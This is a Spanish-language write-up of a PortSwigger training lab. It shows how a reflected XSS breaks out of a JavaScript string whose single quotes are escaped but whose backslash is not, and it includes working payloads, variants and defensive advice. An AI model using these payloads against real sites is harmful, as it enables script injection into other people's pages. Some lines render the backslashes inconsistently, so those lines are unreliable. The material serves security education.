# Lab 33 — Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

**Categoría:** Cross-site scripting  
**Tipo:** Reflected XSS  
**Contexto:** cadena de texto JavaScript dentro de un bloque `<script>`  
**Protecciones presentes:**

- Los signos de ángulo `<` y `>` están codificados en HTML.
- Las comillas dobles `"` están codificadas en HTML.
- Las comillas simples `'` están escapadas con barra invertida.
- La barra invertida `\` **no** está escapada correctamente.

**URL del laboratorio:**  
`https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped`

---

## 1. Objetivo del laboratorio

El laboratorio indica que existe una vulnerabilidad de **XSS reflejado** en la funcionalidad de búsqueda.

La entrada del usuario se refleja dentro de una cadena JavaScript. El objetivo es conseguir salir de esa cadena y ejecutar:

```js
alert(1)
```

La dificultad está en que el servidor aplica varias transformaciones defensivas:

```text
<  y  >  → HTML-encoded
"        → HTML-encoded
'        → escapada como \'
\        → NO escapada
```

El payload que resuelve el laboratorio es:

```text
\'-alert(1)//
```

---

## 2. Imagen inicial del laboratorio

Al abrir el laboratorio vemos una página tipo blog con un buscador.

![Página inicial del laboratorio](images/image1_lab_home.png)

La funcionalidad vulnerable es el buscador. Todo el ataque se realiza introduciendo payloads en ese campo de búsqueda.

---

## 3. Qué tipo de XSS es

Este laboratorio es un **XSS reflejado**.

Es reflejado porque:

1. El payload se envía en una petición HTTP.
2. El servidor lo devuelve en la respuesta.
3. El navegador interpreta esa respuesta.
4. El código JavaScript termina ejecutándose en el navegador.

No es XSS almacenado porque el payload no queda guardado en la base de datos.

No es DOM XSS puro porque el dato viene ya reflejado desde el servidor dentro del HTML de la respuesta. Luego JavaScript lo usa, pero la reflexión vulnerable está ya en la respuesta generada por el backend.

---

## 4. Contexto vulnerable real

Cuando buscamos una cadena normal como:

```text
pepe1
```

la página devuelve algo parecido a esto:

```html
<script>
    var searchTerms = 'pepe1';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

La línea importante es esta:

```js
var searchTerms = 'pepe1';
```

Tu entrada está aquí:

```js
var searchTerms = 'AQUÍ_VA_TU_INPUT';
```

Eso significa que estás dentro de una **cadena JavaScript delimitada por comillas simples**.

El contexto exacto es:

```text
HTML
 └── <script>
      └── JavaScript
           └── string con comillas simples
```

Este detalle importa muchísimo, porque no estás inyectando en HTML plano. No estás dentro de:

```html
<h1>AQUÍ</h1>
```

Tampoco estás dentro de un atributo HTML como:

```html
<input value="AQUÍ">
```

Estás dentro de:

```js
'...'
```

Por tanto, el ataque debe romper una cadena JavaScript.

---

## 5. Primer concepto clave: no todos los XSS se explotan igual

Un error típico es intentar siempre lo mismo:

```html
<script>alert(1)</script>
```

Pero ese payload depende de poder crear una etiqueta HTML nueva.

En este laboratorio eso no es el camino principal, porque:

- `<` está codificado.
- `>` está codificado.
- `"` está codificada.
- La reflexión útil está dentro de JavaScript.

Por tanto, el ataque no consiste en crear una etiqueta `<script>` nueva. Consiste en cerrar o romper la cadena JavaScript existente y convertir parte de tu input en código ejecutable.

---

## 6. Qué pasaría en una aplicación vulnerable sin defensas

Si el código fuera:

```js
var searchTerms = 'pepe1';
```

y el servidor no escapara nada, podríamos enviar:

```text
';alert(1)//
```

El resultado sería:

```js
var searchTerms = '';alert(1)//';
```

JavaScript lo interpreta así:

```js
var searchTerms = '';
alert(1);
//';
```

Explicación:

- La primera `'` de nuestro payload cierra la cadena.
- `alert(1)` queda fuera de la cadena y se ejecuta.
- `//` comenta la comilla final que añade el código original.

Ese sería el ataque clásico en contexto JavaScript.

Pero aquí no funciona de forma directa.

---

## 7. Defensa 1: las comillas simples están escapadas

Cuando introducimos:

```text
pepe1'
```

el servidor no devuelve:

```js
var searchTerms = 'pepe1'';
```

Devuelve:

```js
var searchTerms = 'pepe1\'';
```

Es decir, la comilla simple se convierte en:

```text
\'
```

En JavaScript, `\'` significa:

```text
una comilla simple literal dentro del string
```

No significa:

```text
cerrar la cadena
```

Por tanto, la comilla queda neutralizada.

---

## 8. Qué significa exactamente `\'` en JavaScript

Dentro de una cadena delimitada por comillas simples:

```js
var x = 'hola';
```

una comilla simple cerraría la cadena:

```js
var x = 'hola' + algo;
```

Pero si la comilla lleva barra delante:

```js
var x = 'hola\'mundo';
```

JavaScript interpreta el contenido como:

```text
hola'mundo
```

La comilla no cierra nada.

Por eso, cuando el backend convierte `'` en `\'`, evita que podamos salir del string usando una comilla simple normal.

---

## 9. Defensa 2: `<` y `>` están HTML-encoded

El laboratorio también indica que los signos de ángulo están codificados.

Eso significa que si intentamos:

```html
<script>alert(1)</script>
```

el servidor no lo deja como HTML real.

Lo convierte conceptualmente en algo como:

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

o lo refleja de forma equivalente como texto, no como una etiqueta ejecutable.

Por eso no podemos usar una salida como la del lab anterior:

```html
</script><script>alert(1)</script>
```

En el lab anterior esa técnica funcionaba porque `</script>` llegaba literal al navegador. Aquí `<` y `>` están codificados, así que el parser HTML no ve una etiqueta real.

---

## 10. Defensa 3: las comillas dobles están HTML-encoded

También están codificadas las comillas dobles `"`.

Eso afecta a payloads que intentan romper atributos HTML o crear JavaScript usando comillas dobles.

Por ejemplo, en contextos de atributo podríamos usar algo como:

```text
" onmouseover="alert(1)
```

Pero aquí las dobles comillas no son útiles porque:

1. La reflexión principal está dentro de una cadena con comillas simples.
2. Las dobles comillas están codificadas.
3. No necesitamos `"` para resolver este lab.

---

## 11. El fallo real: la barra invertida no está escapada

Esta es la clave del laboratorio.

La aplicación escapa `'`, pero no escapa `\`.

Eso crea una inconsistencia en la lógica de escape.

El backend hace algo similar a:

```text
'  →  \'
```

pero no hace:

```text
\  →  \\
```

Esta diferencia permite que usemos una barra invertida controlada por nosotros para modificar cómo JavaScript interpreta la barra que el servidor añade.

---

## 12. Qué significa que una barra invertida no esté escapada

Si enviamos:

```text
\
```

y la aplicación la deja tal cual, entonces nuestra barra llega viva al contexto JavaScript.

Eso es peligroso porque `\` es el carácter de escape de JavaScript.

Puede cambiar el significado del siguiente carácter.

En este laboratorio, la usamos para interferir con el escape que el servidor mete delante de la comilla simple.

---

## 13. El payload final

Payload:

```text
\'-alert(1)//
```

Visualmente tiene tres partes:

```text
\'      -alert(1)      //
│       │              │
│       │              └── comenta el resto de la línea
│       └──────────────── ejecuta alert(1) como expresión JS
└──────────────────────── truco para anular el escape de la comilla
```

---

## 14. Qué enviamos nosotros exactamente

Nosotros escribimos en el buscador:

```text
\'-alert(1)//
```

Caracteres reales:

1. Una barra invertida: `\`
2. Una comilla simple: `'`
3. Un guion/resta: `-`
4. La llamada: `alert(1)`
5. Dos barras: `//`

---

## 15. Qué hace el servidor con ese payload

El servidor ve una comilla simple `'` y la escapa.

Nuestro input:

```text
\'-alert(1)//
```

Después del escape de la comilla simple, queda en el JavaScript como:

```js
var searchTerms = '\\'-alert(1)//';
```

Esto es lo que vemos en el DOM:

```html
<script>
    var searchTerms = '\\'-alert(1)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Aquí está la clave:

```js
'\\'-alert(1)//'
```

Hay dos barras seguidas antes de la comilla.

---

## 16. Por qué se forman dos barras `\\'`

Nosotros enviamos una barra:

```text
\
```

El servidor añade otra barra para escapar la comilla:

```text
\'
```

Juntas quedan:

```text
\\'
```

Es decir:

```text
barra nuestra + barra del servidor + comilla
```

En texto:

```text
\  \'
```

Pero en el código JavaScript final se ve como:

```js
\\'
```

---

## 17. Cómo interpreta JavaScript `\\'`

Dentro de un string JavaScript, las barras se procesan de izquierda a derecha.

Secuencia:

```js
\\'
```

JavaScript lee:

```js
\\
```

como una barra invertida literal dentro del string.

Después queda la comilla:

```js
'
```

Y esa comilla ya **no** está escapada.

Por tanto, esa comilla cierra la cadena.

---

## 18. Corrección importante: `\\` no es string vacío

No hay que decir que:

```js
'\\'
```

sea un string vacío.

Eso sería incorrecto.

```js
''
```

es string vacío.

```js
'\\'
```

es un string que contiene una barra invertida literal.

La explotación no depende de que la cadena esté vacía. Depende de que la cadena se cierre antes de `-alert(1)//`.

La forma más precisa de entenderlo es:

```js
var searchTerms = '\\'-alert(1)//';
```

JavaScript interpreta la parte inicial como una cadena válida que contiene una barra invertida, y luego evalúa:

```js
-alert(1)
```

fuera de la cadena.

---

## 19. Transformación paso a paso del payload

### 19.1 Código original

```js
var searchTerms = 'INPUT';
```

### 19.2 Input enviado

```text
\'-alert(1)//
```

### 19.3 El servidor escapa la comilla

```text
\'  →  \\\'
```

Conceptualmente:

```text
nuestra barra + barra añadida por el servidor + comilla
```

### 19.4 Código que llega al navegador

```js
var searchTerms = '\\'-alert(1)//';
```

### 19.5 JavaScript lo interpreta como

```js
var searchTerms = '\' - alert(1) //';
```

Donde:

- `'\\'` es una cadena válida.
- `-alert(1)` se evalúa como expresión.
- `//';` queda comentado.

---

## 20. Por qué `-alert(1)` ejecuta la función

En JavaScript, una expresión como esta es válida:

```js
'texto' - alert(1)
```

Para evaluar esa expresión, JavaScript necesita evaluar ambos lados del operador `-`.

Evalúa primero:

```js
'\\'
```

Luego evalúa:

```js
alert(1)
```

Y al evaluar `alert(1)`, se muestra el popup.

Después intentará realizar una resta entre una cadena y el valor devuelto por `alert()`. El resultado numérico no importa.

Lo importante es que la llamada a `alert(1)` ya se ejecutó.

---

## 21. Por qué se usa `-` y no `;`

Se podría pensar en usar:

```text
\';alert(1)//
```

Pero el payload del lab usa:

```text
\'-alert(1)//
```

El operador `-` permite ejecutar `alert(1)` dentro de una expresión.

Ventajas:

- No dependemos de insertar punto y coma.
- La línea sigue siendo una expresión JavaScript válida.
- Es una técnica común en XSS dentro de strings.

También se podría ver en otros labs con:

```text
'-alert(1)-'
```

La idea es la misma: usar operadores aritméticos como pegamento sintáctico.

---

## 22. Para qué sirve `//`

Después de ejecutar `alert(1)`, el código original todavía tiene una comilla de cierre:

```js
';
```

Si no comentamos esa parte, el script podría quedar roto.

Payload sin comentario:

```text
\'-alert(1)
```

Resultado conceptual:

```js
var searchTerms = '\'-alert(1)';
```

Esa comilla final puede generar error de sintaxis.

Por eso añadimos:

```js
//
```

El resultado queda:

```js
var searchTerms = '\'-alert(1)//';
```

La parte final:

```js
//';
```

queda comentada.

Así evitamos que la comilla y el resto de la línea rompan el JavaScript.

---

## 23. Por qué no hace falta punto y coma

JavaScript tiene **ASI**: Automatic Semicolon Insertion.

Eso significa que muchas sentencias pueden funcionar sin `;` explícito.

Además, aquí no necesitamos terminar una sentencia limpia con punto y coma porque usamos una expresión válida:

```js
var searchTerms = '\'-alert(1)//';
```

La asignación queda sintácticamente válida hasta el comentario.

---

## 24. Prueba práctica con cadena normal

Abrimos el laboratorio:

```text
https://0a8400dc049d0cce812f980f00a100ef.web-security-academy.net/
```

La página inicial se ve así:

![Página inicial](images/image1_lab_home.png)

Introducimos:

```text
pepe1
```

Inspeccionamos el DOM y vemos:

```html
<script>
    var searchTerms = 'pepe1';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Conclusión:

```text
El input está dentro de una cadena JavaScript con comillas simples.
```

---

## 25. Prueba con comilla simple

Introducimos:

```text
pepe1'
```

El DOM muestra:

```html
<script>
    var searchTerms = 'pepe1\'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Conclusión:

```text
La comilla simple se escapa como \'.
```

Por tanto, un payload como:

```text
pepe1'-alert(1)//
```

no funciona, porque la comilla no cierra el string.

---

## 26. Prueba fallida con `pepe' -alert()`

Probamos algo tipo:

```text
pepe' -alert()
```

El resultado es:

```js
var searchTerms = 'pepe\' -alert()   ';
```

Parece que estamos intentando ejecutar `alert()`, pero no lo conseguimos porque:

- la comilla está escapada;
- `-alert()` queda dentro del string;
- no hemos salido realmente de la cadena JavaScript.

El navegador interpreta todo como texto dentro de `searchTerms`.

---

## 27. Payload correcto

Introducimos:

```text
\'-alert(1)//
```

El DOM queda así:

```html
<script>
    var searchTerms = '\\'-alert(1)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Esta vez sí funciona.

Aparece el popup:

![Popup alert](images/image2_alert_popup.png)

Y el laboratorio queda resuelto:

![Laboratorio resuelto](images/image3_lab_solved.png)

---

## 28. Qué se ve en la página resuelta

En la imagen final aparece:

```text
0 search results for '\'-alert(1)//'
```

Esto es normal.

La página también refleja el input en HTML visible, no solo en el script.

Pero el XSS no ocurre por ese `<h1>`. Ocurre por la reflexión dentro de:

```js
var searchTerms = '...';
```

El texto visible solo nos confirma qué payload estamos enviando.

---

## 29. Diferencia con el lab anterior

En el lab anterior, la solución era:

```html
</script><script>alert(1)</script>
```

Porque `<` y `>` no estaban bloqueados.

En este lab, eso no funciona porque `<` y `>` están HTML-encoded.

Por tanto, ya no podemos cerrar el bloque `<script>`.

Tenemos que escapar de la cadena JavaScript por dentro, usando el fallo de escape de la barra invertida.

Comparación:

| Lab | Defensa | Técnica |
|---|---|---|
| Lab anterior | `'` y `\` escapadas, pero `< >` permitidos | cerrar `</script>` |
| Lab actual | `< >` y `"` codificados, `'` escapada, `\` no escapada | romper escape con `\'` |

---

## 30. Diferencia con un XSS HTML normal

En un XSS HTML normal buscamos generar algo como:

```html
<img src=x onerror=alert(1)>
```

Aquí eso no sirve porque:

- `<` y `>` están codificados.
- El contexto principal está dentro de JavaScript.

En este lab no creamos una etiqueta nueva.

Ejecutamos código dentro del script ya existente.

---

## 31. Diferencia con XSS en atributo HTML

En un atributo HTML podríamos tener:

```html
<input value="INPUT">
```

Y usar:

```text
" autofocus onfocus=alert(1) x="
```

Pero aquí no estamos dentro de un atributo HTML.

Estamos dentro de:

```js
var searchTerms = 'INPUT';
```

Por eso la estrategia correcta es de JavaScript string injection.

---

## 32. Por qué HTML encoding de `"` no importa demasiado aquí

El laboratorio menciona que las dobles comillas están HTML-encoded.

Eso puede ser relevante si intentáramos romper un atributo HTML.

Pero aquí el string usa comillas simples:

```js
'INPUT'
```

Por tanto, las dobles comillas no son necesarias para el payload final.

El payload final no usa `"`:

```text
\'-alert(1)//
```

Esto demuestra algo importante: no todas las protecciones bloquean todos los caminos. Hay que explotar el carácter que sí sigue siendo útil.

---

## 33. Modelo mental del bug

El backend piensa:

> “Si escapo la comilla simple, el usuario no puede cerrar el string.”

Pero olvida que la barra invertida es parte del mecanismo de escape.

Si no escapas también la barra invertida, el atacante puede introducir una barra que cambie el significado de la barra añadida por el servidor.

La regla correcta sería:

```text
Primero escapar \ como \\
Luego escapar ' como \'
```

Si solo haces:

```text
' → \'
```

y dejas `\` intacta, tu escape puede ser manipulado.

---

## 34. Por qué importa el orden de escapes

En sistemas reales, no solo importa qué caracteres se escapan, sino también el orden.

Ejemplo correcto conceptual:

```text
\  →  \\
'  →  \'
```

Si escapas primero `'` y luego manipulas mal las barras, puedes introducir inconsistencias.

En este lab, el problema principal es que `\` no se escapa, pero en aplicaciones reales el orden incorrecto también puede abrir bugs.

---

## 35. Variantes del payload

El payload base es:

```text
\'-alert(1)//
```

Variantes posibles dependiendo del contexto:

### Variante 1 — usando suma

```text
\'+alert(1)//
```

Puede funcionar si el resultado queda sintácticamente válido.

### Variante 2 — usando punto y coma

```text
\';alert(1)//
```

Puede funcionar si el parser acepta la secuencia resultante y no hay filtros adicionales.

### Variante 3 — usando comentarios multilínea

```text
\'-alert(1)/*
```

Si la estructura posterior lo permite, se puede comentar el resto con `/*`.

### Variante 4 — usando otra función

```text
\'-print()//
```

Si el objetivo fuese `print()`.

### Variante 5 — payload URL-encoded

```text
%5C%27-alert(1)//
```

Donde:

- `%5C` es `\`
- `%27` es `'`

En una URL quedaría:

```text
/?search=%5C%27-alert(1)//
```

---

## 36. Por qué `alert()` aparece aunque el resultado matemático no tenga sentido

La expresión:

```js
'\\' - alert(1)
```

no busca obtener un resultado útil.

Solo usa el operador `-` para forzar la evaluación de `alert(1)`.

JavaScript evaluará la función antes de intentar la resta.

El resultado puede ser `NaN`, `undefined` o lo que toque internamente. Eso no importa.

El objetivo es la ejecución del efecto lateral: el popup.

---

## 37. Qué ocurre después de `alert(1)`

El comentario `//` evita que el resto de la línea cause problemas.

Sin `//`, el código podría quedar con una comilla final suelta.

Con `//`, queda así:

```js
var searchTerms = '\\'-alert(1)//';
```

Todo después de `//` se ignora hasta el final de línea.

La comilla final original queda anulada.

---

## 38. Por qué este payload es más “limpio” que cerrar `</script>`

Cerrar `</script>` suele romper más la estructura del documento.

Aquí, en cambio, ejecutamos dentro del propio JavaScript.

Ventajas:

- Menos HTML roto.
- Menos residuos visibles.
- La ejecución ocurre dentro del bloque existente.
- No dependemos de crear etiquetas HTML.

Desventaja:

- Necesitamos un fallo específico: que `\` no esté escapada.

---

## 39. Qué debería hacer una defensa correcta

### 39.1 Escapar también la barra invertida

Si la aplicación va a insertar datos dentro de una cadena JavaScript, debe escapar `\`.

Correcto:

```text
\  →  \\
'  →  \'
```

Si la barra se escapara correctamente, nuestro payload:

```text
\'-alert(1)//
```

no formaría `\\'` de manera explotable.

---

### 39.2 No construir JavaScript con concatenación de strings

Evitar:

```html
<script>
var searchTerms = 'USER_INPUT';
</script>
```

Es mejor usar mecanismos seguros para serializar datos.

---

### 39.3 Usar serialización JSON segura

Ejemplo conceptual:

```html
<script>
const searchTerms = JSON.parse(document.getElementById('search-data').textContent);
</script>
<script type="application/json" id="search-data">
"valor seguro"
</script>
```

Y aun así hay que escapar secuencias peligrosas como `</script>` si se incrusta JSON en HTML.

---

### 39.4 Escapar según el contexto exacto

No existe un único escape universal.

Cada contexto necesita un escape diferente:

| Contexto | Escape necesario |
|---|---|
| HTML text | HTML entity encoding |
| HTML attribute | entity encoding + comillas |
| JavaScript string | JS string escaping |
| URL | URL encoding |
| CSS | CSS escaping |

Este lab demuestra que codificar `<`, `>` y `"` no basta si el contexto real es JavaScript string y dejas viva la barra invertida.

---

### 39.5 CSP como defensa adicional

Una Content Security Policy estricta puede reducir impacto:

```http
Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'none'
```

Pero si la página permite scripts inline con `'unsafe-inline'`, una CSP débil no bloqueará este tipo de ejecución.

La CSP ayuda, pero no sustituye al escape correcto.

---

## 40. Checklist mental para este tipo de laboratorio

Cuando veas input dentro de:

```js
var x = 'INPUT';
```

comprueba:

1. ¿Puedo cerrar con `'`?
2. ¿La comilla se escapa como `\'`?
3. ¿La barra invertida `\` se escapa?
4. ¿Puedo usar `\'` para anular el escape?
5. ¿Necesito `//` para comentar el resto?
6. ¿Están permitidos `<` y `>`?
7. ¿Puedo cerrar `</script>` o no?
8. ¿Hay CSP?
9. ¿El payload se refleja también en otros contextos?
10. ¿Qué contexto ejecuta realmente el código?

En este lab:

```text
'        escapada
\        no escapada
< >      codificados
"        codificada
```

Payload:

```text
\'-alert(1)//
```

---

## 41. Resumen final del ataque

1. El buscador refleja el input dentro de:

   ```js
   var searchTerms = 'INPUT';
   ```

2. La comilla simple no sirve porque se transforma en:

   ```js
   \'
   ```

3. `<`, `>` y `"` tampoco sirven para crear HTML o romper atributos.

4. La barra invertida `\` no se escapa.

5. Enviamos:

   ```text
   \'-alert(1)//
   ```

6. El servidor escapa `'`, generando:

   ```js
   '\\'-alert(1)//'
   ```

7. JavaScript interpreta `\\` como una barra literal y la comilla siguiente queda libre para cerrar el string.

8. `-alert(1)` se evalúa fuera de la cadena.

9. `//` comenta la comilla final.

10. Se ejecuta el popup y el laboratorio queda resuelto.

---

## 42. Imágenes

### Imagen 1 — Página inicial

![Página inicial](images/image1_lab_home.png)

### Imagen 2 — Popup `alert(1)`

![Popup alert](images/image2_alert_popup.png)

### Imagen 3 — Laboratorio resuelto

![Laboratorio resuelto](images/image3_lab_solved.png)
